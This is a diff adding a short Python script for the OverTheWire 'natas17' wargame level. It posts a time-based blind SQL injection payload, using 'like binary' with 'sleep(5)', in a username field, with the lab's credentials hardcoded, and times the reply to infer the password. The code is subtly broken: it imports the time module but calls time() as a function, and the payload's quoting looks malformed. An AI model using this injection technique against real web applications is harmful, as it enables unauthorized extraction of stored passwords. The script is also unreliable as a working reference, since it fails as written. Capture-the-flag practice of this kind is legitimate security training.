@@ -1,0 +1,15 @@
+import requests
+import time
+
+url = "http://natas17.natas.labs.overthewire.org:80/index.php?debug=1"
+login = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+input = """natas18" and password like binary '%a% and sleep(5) #"""
+print(input)
+data = {"username": input}
+
+start = time()
+r = requests.post(url, data, auth=login)
+finish = time()
+print(r.text)
+print(f"Query took {finish - start} seconds")
+
